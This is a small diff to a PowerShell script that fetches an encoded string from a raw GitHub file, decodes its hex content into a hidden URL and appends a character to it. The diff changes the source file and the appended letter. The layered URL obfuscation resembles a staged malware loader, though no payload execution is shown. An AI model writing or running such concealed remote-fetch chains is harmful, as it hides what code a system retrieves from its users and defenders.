@@ -44,7 +44,7 @@ Function Convert-HexToText {
 }
 
 # URL of the hosted text file
-$url = "https://raw.githubusercontent.com/notforuseactually/404/main/5.txt" # Replace this with the actual URL containing the custom encoded string
+$url = "https://raw.githubusercontent.com/notforuseactually/404/main/6.txt" # Replace this with the actual URL containing the custom encoded string
 
 # Use Invoke-RestMethod to fetch the content from the URL
 $rawText = Invoke-RestMethod -Uri $url -ErrorAction Stop
@@ -69,7 +69,7 @@ Write-Host $hexText
 
 # Convert the hex string to ASCII text (URL)
 $finalUrl = Convert-HexToText -hexInput $hexText
-$finalUrl = $finalUrl + 'l'
+$finalUrl = $finalUrl + 'e'
 
 
 # Display the final URL for troubleshooting
